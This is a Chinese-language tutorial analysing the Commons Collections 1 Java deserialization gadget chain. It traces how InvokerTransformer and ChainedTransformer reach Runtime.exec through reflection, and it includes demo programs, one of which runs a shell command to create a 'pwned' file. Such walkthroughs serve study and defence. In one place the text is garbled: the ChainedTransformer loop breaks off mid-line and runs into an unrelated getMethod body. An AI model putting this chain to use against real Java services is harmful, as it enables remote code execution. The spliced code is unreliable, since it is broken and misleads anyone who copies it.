# CommonsCollections1
CC链基本的点就是在前两个链中，所以我会着重偏向前两个链的介绍，后期的链基本就是换汤不换药，我会适当简略；
LazyMap.get()中：
    public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
可以看到里面if中会去调用factory下的transform方法；我们看下相应属性的定义；
    protected final Transformer factory;
发现定义是个Transformer；其是个接口；追溯一下不难发现其定义：
    public interface Transformer {
        Object transform(Object var1);
    }
那么现在就是寻找可以继承接口的类；找到InvokerTransformer类；
    public class InvokerTransformer implements Transformer, Serializable {
        static final long serialVersionUID = -8653385846894047688L;
        private final String iMethodName;
        private final Class[] iParamTypes;
        private final Object[] iArgs;
            public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
            this.iMethodName = methodName;
            this.iParamTypes = paramTypes;
            this.iArgs = args;
        }
        public Object transform(Object input) {
            if (input == null) {
                return null;
            } else {
                try {
                    Class cls = input.getClass();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                    return method.invoke(input, this.iArgs);
                } catch (NoSuchMethodException var5) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
                } catch (IllegalAccessException var6) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
                } catch (InvocationTargetException var7) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
                }
            }
        }
这里摘取主要的一些源码进行分析；发现在其类中继承了接口之后又将其重写，这里就可直接调用；关键的函数是在这几行：
    Class cls = input.getClass();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                    return method.invoke(input, this.iArgs);
这里获取我们传入的类，然后拿到类中的方法和参数类型；然后最后竟然直接invoke直接执行了这个方法；回溯这个类，我们发现所有的参数都是我们可控的，碉堡了；这就直接可调用任意类下的任意函数，并且参数还是我们可控的；这就造成了很大的安全问题；那么目标点就很明确了；寻找命令执行函数；发现在Runtime类下有个exec函数可执行命令；这也是这个chain的走向；
追溯下：
    public Process exec(String command) throws IOException {
        return exec(command, null, null);
    }
这里直接调用了exec函数去执行命令；那么我们的思路也就很简单了，在上个文件中赋如下的值：
    Class cls = input.getClass();//input : new java.lang.Runtime();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
       //iMethodName:"exec" iParamTypes:    String.class          
                                    return method.invoke(input, this.iArgs);//iArgs:"calc.exe"
当我们上述的变量赋值为我们希望的值的时候，进入下一个Runtime类的时候就会进行命令执行造成rce；
这里先写个简单的demo证明下Runtime类下的exec造成rce的效果；
    package com.company;
    import java.lang.Runtime;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Method;
    public class runtime_exec {
        public static void main(String[] args) throws Exception{
           Class s1mple = java.lang.Runtime.class;
           System.out.println(s1mple);
           Constructor s2mple = s1mple.getDeclaredConstructor();
           s2mple.setAccessible(true);
           Object s3mple = s2mple.newInstance();
           Method s4mple = s1mple.getMethod("exec",String.class);
           s4mple.invoke(s3mple,"touch pwned_by_s1mple");
        }
    }
会发现生成了个pwned_by_s1mple文件；现在开始寻找如何利用链构造上述的代码；
幸运的是我们在ChainedTransformer类中找到了可以完成上述链的写法；
    public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }
    public Object transform(Object object) {
        for(int i = 0; i ... parameterTypes)
        throws NoSuchMethodException, SecurityException {
        checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), true);
        Method method = getMethod0(name, parameterTypes, true);
        if (method == null) {
            throw new NoSuchMethodException(getName() + "." + name + argumentTypesToString(parameterTypes));
        }
        return method;
    }
不难发现有两个参数；第一个为字符串对象；第二个为Class的多参数，这里既是多参数；那么我们写java程序也就很简单了；写一个简单的demo来实现上述的逻辑：
    public class runtime_exec {
       public static void main(String[] args) throws Exception {
    Object Runtime = java.lang.Runtime.class;
    Class s2mple = Runtime.getClass();
    Method s3mple = s2mple.getMethod("getMethod", new Class[]{String.class, Class[].class});
    Object aass = s3mple.invoke(Runtime,new Object[]{"getRuntime",null});
     System.out.println("aass="+aass);
       }
    }
    相当于执行了java.lang.Runtime.class.getMethod("getRuntime",null);
然后就成功拿到了getRuntime方法；接着就是执行此方法拿到Runtime对象；继续传入
    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null})
    public Object transform(Object input) {//此时；input已经变成了一个方法类型；
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
传入getClass之后得到Method；然后就可调用Method下的一些方法；追溯Method类invoke方法；
    public Object invoke(Object obj, Object... args)
        throws IllegalAccessException, IllegalArgumentException,
           InvocationTargetException
    {
        if (!override) {
            if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) {
                Class caller = Reflection.getCallerClass();
                checkAccess(caller, clazz, obj, modifiers);
            }
        }
        MethodAccessor ma = methodAccessor;             // read volatile
        if (ma == null) {
            ma = acquireMethodAccessor();
        }
        return ma.invoke(obj, args);
    }
发现其参数为任意对象类型，第二个为多参数；即传数组；这里其实原理也是先通过InvokerTransformer下的getMethod拿到invoke函数，然后再invoke去调用invoke函数；可以继续续写上述的demo；
    public class runtime_exec {
       public static void main(String[] args) throws Exception {
    Object Runtime = java.lang.Runtime.class;
    Class s2mple = Runtime.getClass();
    Method s3mple = s2mple.getMethod("getMethod", new Class[]{String.class, Class[].class});
    Object aass = s3mple.invoke(Runtime,new Object[]{"getRuntime",null});
     System.out.println("aass="+aass);
    Class s4mple = aass.getClass();
         Method s5mple = s4mple.getMethod("invoke",new Class[]{Object.class, Object[].class});
       Object tt =   s5mple.invoke(aass,null,null);
         System.out.println(tt);//即可拿到实例化的Runtime类对象；
       }
    }